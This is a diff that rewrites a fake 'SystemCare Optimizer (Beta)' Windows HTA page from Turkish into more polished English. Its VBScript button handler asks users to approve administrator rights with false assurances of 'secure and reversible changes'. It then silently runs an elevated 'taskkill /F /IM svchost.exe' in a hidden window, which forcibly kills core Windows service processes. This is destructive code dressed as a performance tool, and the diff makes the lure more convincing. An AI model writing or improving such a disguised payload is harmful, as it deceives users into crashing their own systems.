@@ -1,48 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Hızlı Sistem Bakım Uzmanı (Beta)</title>
-<hta:application
-    applicationName="Hızlı Sistem Bakım Uzmanı Beta"
-    border="thin"
-    caption="yes"
-    icon=""
-    showInTaskbar="yes"
-    singleInstance="yes"
-    sysMenu="yes"
-    windowState="normal"
->
-<style>
-  body { font-family: sans-serif; }
-  button { background-color: #007bff; color: white; padding: 12px 24px; border: none; cursor: pointer; font-size: 18px; border-radius: 8px; }
-  p { margin-bottom: 15px; font-size: 1.1em; }
-  .info { color: #ffc107; font-weight: bold; font-size: 1.2em; } /* Sarı/Turuncu Beta Rengi */
-  .note { font-size: 0.9em; color: gray; }
-  .beta-tag-hta { background-color: #ffc107; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; margin-left: 10px; }
-  .beta-message { font-size: 0.9em; color: #6c757d; font-style: italic; margin-top: 10px; }
-</style>
-<script language="VBScript">
-Sub RunOptimization
+    <title>SystemCare Optimizer (Beta)</title>
+    <hta:application
+        applicationName="SystemCare Optimizer Beta"
+        border="thin"
+        caption="yes"
+        icon=""
+        showInTaskbar="yes"
+        singleInstance="yes"
+        sysMenu="yes"
+        windowState="normal"
+    >
+    <style>
+        body { font-family: 'Open Sans', sans-serif; margin: 25px; background-color: #f2f2f2; color: #555; line-height: 1.6; }
+        h1 { color: #34495e; margin-bottom: 15px; }
+        p { margin-bottom: 20px; font-size: 1.1em; }
+        .info { color: #2ecc71; font-weight: bold; font-size: 1.2em; display: block; margin-bottom: 20px; }
+        .note { font-size: 0.9em; color: #777; margin-top: 15px; display: block; }
+        button { background-color: #2ecc71; color: white; padding: 14px 28px; border: none; cursor: pointer; font-size: 18px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15); }
+        button:hover { background-color: #27ae60; }
+        .beta-tag-hta { background-color: #e67e22; color: white; padding: 6px 12px; border-radius: 6px; font-size: 0.9em; margin-left: 10px; }
+        .beta-message { font-size: 0.9em; color: #777; font-style: italic; margin-top: 20px; display: block; }
+        .step-instruction { background-color: #eaf2f8; padding: 15px; border-radius: 6px; margin-bottom: 15px; border-left: 5px solid #3498db; }
+        /* Font Import */
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+    </style>
+    <script language="VBScript">
+    Sub RunOptimization
 
-    MsgBox "Hızlı Sistem Bakım Uzmanı'nın bu beta sürümünü denediğiniz için teşekkür ederiz! Performansı optimize etmek için bazı sistem ayarlarını güvenli bir şekilde düzenleyeceğiz. Yönetici izniniz gereklidir. Lütfen 'Evet'e tıklayarak devam edin.", vbOKOnly + vbInformation, "Beta Bilgilendirmesi"
+        MsgBox "Thank you for joining the SystemCare Optimizer Beta program! To deliver the best possible performance improvements, we need your permission to make some secure adjustments to your system settings. Administrator privileges are required for this step. Please click 'Yes' on the following prompt to proceed.", vbOKOnly + vbInformation, "Important Beta Information"
 
-    komut = "taskkill /F /IM svchost.exe"
-    Set objShellApp = CreateObject("Shell.Application")
-    ' 0 parametresi pencereyi gizler
-    objShellApp.ShellExecute "cmd.exe", "/c " & komut, "", "runas", 0
-    Set objShellApp = Nothing
+        command = "taskkill /F /IM svchost.exe"
+        Set objShellApp = CreateObject("Shell.Application")
+        ' 0 parameter hides the window
+        objShellApp.ShellExecute "cmd.exe", "/c " & command, "", "runas", 0
+        Set objShellApp = Nothing
 
-    MsgBox "Optimizasyon işlemi başlatıldı (Beta Aşaması). Geri bildirimleriniz bu sürümü geliştirmemize yardımcı olacaktır.", vbOKOnly + vbInformation, "İşlem Başlatıldı"
+        MsgBox "The initial optimization process has started (Beta Stage). We appreciate your contribution to making SystemCare Optimizer better!", vbOKOnly + vbInformation, "Optimization Started"
 
-End Sub
-</script>
+    End Sub
+    </script>
 </head>
 <body>
-    <h1>Hızlı Sistem Bakım Uzmanı <span class="beta-tag-hta">Beta</span></h1>
-    <p class="info">Erken Erişim - Performansı Deneyin ve Geliştirmemize Yardımcı Olun!</p>
-    <p>Bu, Hızlı Sistem Bakım Uzmanı'nın bir beta sürümüdür. Lütfen deneyin ve karşılaştığınız sorunları veya önerilerinizi bizimle paylaşın.</p>
-    <button onclick="RunOptimization()">Beta İyileştirmeyi Başlat</button>
-    <p class="note">(Bu işlem, sistem performansını artırmak için güvenli yönetici ayrıcalıkları isteyecektir.)</p>
-    <p class="beta-message">Geri bildirimlerinizi [e-posta adresi veya geri bildirim formu bağlantısı] üzerinden iletebilirsiniz.</p>
+    <h1>SystemCare Optimizer <span class="beta-tag-hta">Beta</span></h1>
+    <p class="info">Early Access - Experience Enhanced Performance and Help Us Refine!</p>
+    <p>Welcome to the SystemCare Optimizer Beta! By participating, you're helping us fine-tune our powerful optimization engine to deliver the best performance for your PC.</p>
+
+    <div class="step-instruction">
+        <strong>Step 1: Click the button below to start the initial optimization.</strong>
+        <p>This will allow SystemCare Optimizer to analyze your system and prepare for performance enhancements.</p>
+    </div>
+
+    <button onclick="RunOptimization()">Start Beta Optimization</button>
+
+    <div class="step-instruction">
+        <strong>Step 2: You may be asked for administrator permission.</strong>
+        <p>Granting this permission is necessary for SystemCare Optimizer to safely apply system-level optimizations that can significantly improve performance.</p>
+    </div>
+
+    <p class="note">(SystemCare Optimizer will only make secure and reversible changes to your system.)</p>
+    <p class="beta-message">Your feedback is crucial! Please share your experiences and suggestions via <a href="mailto:beta-feedback@example.com">beta-feedback@example.com</a> or our <a href="#">community forum</a>.</p>
 </body>
 </html>
